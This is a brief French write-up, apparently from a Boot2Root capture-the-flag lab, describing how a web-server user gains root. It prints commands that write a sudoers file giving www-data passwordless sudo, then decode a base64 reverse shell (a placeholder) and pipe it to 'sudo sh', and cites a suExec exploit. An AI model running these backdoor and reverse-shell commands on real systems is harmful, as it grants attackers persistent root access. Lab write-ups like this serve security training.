# Boot2Root - Backdoor

On recommence à partir de l'étape `Step 8 - Piscine a débordement`

## Step 8 - sudoers

On lance le shellcode trouvable dans `scripts/shellcode.py`
Ce qui nous donne les droits suffisants de lancer ces deux commandes:
```
echo "www-data ALL=(ALL) NOPASSWD: ALL" > /etc/sudoers.d/afile
chmod 0440 /etc/sudoers.d/afile
```

Maintenant, le user du webserver est un sudoer, ce qui crée une backdoor considérable.
Il suffit alors de lancer un reverse shell avec sudo

```
printf "<reverse shell en base64>" | base64 -d | sudo sh
```

Et hop root !

## Sources
Exploit suExec: https://www.exploit-db.com/exploits/27397